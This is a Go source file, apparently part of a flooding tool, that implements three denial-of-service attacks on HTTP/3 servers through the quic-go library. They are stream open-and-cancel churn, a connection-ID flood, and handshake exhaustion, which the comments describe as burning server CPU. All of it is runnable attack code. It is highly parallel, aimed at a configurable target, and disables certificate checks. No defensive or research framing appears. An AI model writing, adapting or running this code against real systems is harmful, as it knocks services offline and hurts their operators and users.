package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/quic-go/quic-go"
)

func runQUICStreamHijack(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)
	log.Printf("QUIC Stream Hijack starting | threads=%d", cfg.Threads)

	host := extractHost(cfg.Target)
	port := extractPort(cfg.Target, "443")
	addr := net.JoinHostPort(host, port)
	sem := make(chan struct{}, cfg.MaxConns)

	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				sem <- struct{}{}
				go func() {
					defer func() { <-sem }()
					defer func() {
						if r := recover(); r != nil {
							atomic.AddInt64(&metrics.Failed, 1)
						}
					}()

					conn := dialQUIC(addr, host, 5*time.Second)
					if conn == nil {
						atomic.AddInt64(&metrics.Failed, 1)
						return
					}

					// Open and cancel many streams per connection
					maxStreams := 10 + int(atomic.LoadInt64(&metrics.Completed)%20)
					for j := 0; j < maxStreams; j++ {
						if time.Now().After(deadline) || atomic.LoadInt32(&stopFlag) == 1 {
							break
						}
						stream, err := conn.OpenStreamSync(context.Background())
						if err != nil {
							break
						}
						payload := fmt.Sprintf("GET /?%d HTTP/3\r\nHost: %s\r\n\r\n",
							time.Now().UnixNano(), host)
						stream.Write([]byte(payload))
						time.Sleep(time.Duration(1+int(atomic.LoadInt64(&metrics.Completed)%5)) * time.Millisecond)
						stream.CancelRead(0)
						stream.CancelWrite(0)
						atomic.AddInt64(&metrics.Completed, 1)
						atomic.AddInt64(&metrics.TotalRequests, 1)
					}
					conn.CloseWithError(0, "hijack")
				}()
			}
		}(i)
	}
	wg.Wait()
	atomic.StoreInt32(&stopFlag, 1)
	metrics.Elapsed = time.Since(startTime).Seconds()
}

func runQUICConnFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)
	log.Printf("QUIC Connection ID Flood starting | threads=%d max_conns=%d", cfg.Threads, cfg.MaxConns)

	host := extractHost(cfg.Target)
	port := extractPort(cfg.Target, "443")
	addr := net.JoinHostPort(host, port)
	sem := make(chan struct{}, cfg.MaxConns)

	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				sem <- struct{}{}
				go func() {
					defer func() { <-sem }()
					defer func() {
						if r := recover(); r != nil {
							atomic.AddInt64(&metrics.Failed, 1)
						}
					}()

					// Each dial creates a unique server-side CID entry
					conn := dialQUIC(addr, host, 4*time.Second)
					if conn == nil {
						atomic.AddInt64(&metrics.Failed, 1)
						return
					}
					// One stream to validate connectivity
					stream, err := conn.OpenStreamSync(context.Background())
					if err == nil {
						stream.Write([]byte("GET / HTTP/3\r\nHost: " + host + "\r\n\r\n"))
						atomic.AddInt64(&metrics.Completed, 1)
					}
					conn.CloseWithError(0, "cid-flood")
					atomic.AddInt64(&metrics.TotalRequests, 1)
				}()
			}
		}(i)
	}
	wg.Wait()
	atomic.StoreInt32(&stopFlag, 1)
	metrics.Elapsed = time.Since(startTime).Seconds()
}

func runQUICCryptoExhaust(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)
	log.Printf("QUIC Crypto Handshake Exhaustion starting | threads=%d", cfg.Threads)

	host := extractHost(cfg.Target)
	port := extractPort(cfg.Target, "443")
	addr := net.JoinHostPort(host, port)

	// Use a large channel as backpressure but allow aggressive parallelism
	sem := make(chan struct{}, cfg.MaxConns*2)

	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads*2; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				sem <- struct{}{}
				go func() {
					defer func() { <-sem }()
					defer func() {
						if r := recover(); r != nil {
							atomic.AddInt64(&metrics.Failed, 1)
						}
					}()

					// Use expensive TLS config to maximize server CPU burn
					tlsCfg := &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         host,
						NextProtos:         []string{"h3", "h2"},
						CipherSuites: []uint16{
							tls.TLS_AES_128_GCM_SHA256,
							tls.TLS_CHACHA20_POLY1305_SHA256,
							tls.TLS_AES_256_GCM_SHA384,
						},
						CurvePreferences: []tls.CurveID{
							tls.CurveP256, tls.CurveP384, tls.X25519,
						},
					}
					qConf := &quic.Config{
						MaxIdleTimeout:             500 * time.Millisecond,
						KeepAlivePeriod:            0,
						InitialStreamReceiveWindow: 256 * 1024,
						MaxStreamReceiveWindow:     256 * 1024,
						MaxIncomingStreams:         100,
						DisablePathMTUDiscovery:    true,
					}

					// Very short timeout - handshake starts but may not complete
					ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
					conn, err := quic.DialAddr(ctx, addr, tlsCfg, qConf)
					cancel()
					if err == nil {
						conn.CloseWithError(0, "burn")
						atomic.AddInt64(&metrics.Completed, 1)
					}
					atomic.AddInt64(&metrics.TotalRequests, 1)
				}()
			}
		}(i)
	}
	wg.Wait()
	atomic.StoreInt32(&stopFlag, 1)
	metrics.Elapsed = time.Since(startTime).Seconds()
}

func dialQUIC(addr, host string, timeout time.Duration) quic.Connection {
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		NextProtos:         []string{"h3", "h2"},
	}
	qConf := &quic.Config{
		MaxIdleTimeout:          timeout,
		KeepAlivePeriod:         0,
		InitialStreamReceiveWindow: 64 * 1024,
		MaxStreamReceiveWindow:     64 * 1024,
		MaxIncomingStreams:         100,
		DisablePathMTUDiscovery:    true,
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	conn, err := quic.DialAddr(ctx, addr, tlsCfg, qConf)
	if err != nil {
		return nil
	}
	return conn
}

func extractPort(target, def string) string {
	host := extractHost(target)
	if _, p, err := net.SplitHostPort(host); err == nil {
		return p
	}
	return def
}

func extractHost(target string) string {
	if strings.Contains(target, "://") {
		u, err := url.Parse(target)
		if err == nil && u.Host != "" {
			return u.Host
		}
	}
	return target
}
